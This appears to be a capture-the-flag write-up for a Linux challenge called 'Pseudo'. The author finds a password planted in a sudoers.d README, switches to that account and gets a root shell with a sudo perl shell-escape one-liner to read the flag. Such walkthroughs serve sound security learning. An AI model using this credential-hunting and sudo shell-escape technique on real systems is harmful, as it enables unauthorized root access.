# Pseudo | Miscellaneous

*Someone here has special powers... but who? and how!?*

Connecting via SSH to `challenge.ctf.games` as `user`.  The `/home` directory is filled with users, none of which contain anything useful.  Going into `/etc/sudoers.d` and reading the `README`

```
user@pseudo-41ddd916b182c8ee-6c985ccc-gc722:/etc/sudoers.d$ cat README
#
# As of Debian version 1.7.2p1-1, the default /etc/sudoers file created on
# installation of the package now includes the directive:
#
#       #includedir /etc/sudoers.d
#
# This will cause sudo to read and parse any files in the /etc/sudoers.d
# directory that do not end in '~' or contain a '.' character.
#
# Note that there must be at least one file in the sudoers.d directory (this
# one will do), and all files in this directory should be mode 0440.
#
# Note also, that because sudoers contents can vary widely, no attempt is
# made to add this directive to existing sudoers files on upgrade.  Feel free
# to add the above directive to the end of your /etc/sudoers file to enable
# this functionality for existing installations if you wish!
#
# Finally, please note that using the visudo command is the recommended way
# to update sudoers content, since it protects against many failure modes.
# See the man page for visudo for more information.
#
#
# The credentials for the 'todd' account is 'needle_in_a_haystack'
```

Switching user using `su`:

```
user@pseudo-41ddd916b182c8ee-6c985ccc-gc722:/etc/sudoers.d$ su todd
Password: 
todd@pseudo-41ddd916b182c8ee-6c985ccc-gc722:/etc/sudoers.d$ 
```

Running `sudo -l` reveals that the `todd` user can run anything with `sudo` without a password.  Privilege escalating with `perl5`:

```
sudo perl -e "exec '/bin/sh';"
# whoami
root
```

```
# cd /root
# ls -la
total 24
drwx------ 1 root root 4096 Sep 13 19:16 .
drwxr-xr-x 1 root root 4096 Sep 14 16:46 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxr-xr-x 2 root root 4096 May 20  2018 .ssh
-rw-r--r-- 1 root root   42 Sep 13 19:14 flag.txt
# cat flag.txt 
flag{hmmm_that_could_be_a_sneaky_backdoor}
```

```
flag{hmmm_that_could_be_a_sneaky_backdoor}
```